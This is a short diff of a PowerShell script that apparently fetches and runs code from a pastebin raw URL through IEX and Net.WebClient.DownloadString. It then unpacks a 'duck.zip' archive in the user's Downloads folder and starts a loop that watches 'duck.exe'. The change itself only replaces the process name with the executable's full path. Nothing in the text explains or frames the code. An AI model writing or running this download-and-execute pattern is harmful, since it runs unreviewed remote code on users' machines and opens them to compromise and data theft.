@@ -1,7 +1,7 @@
 IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -Force
 Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
 
-$processName = "duck.exe"
+$processName = "$env:USERPROFILE\Downloads\duck\duck\duck.exe"
 $running = $true
 
 do {
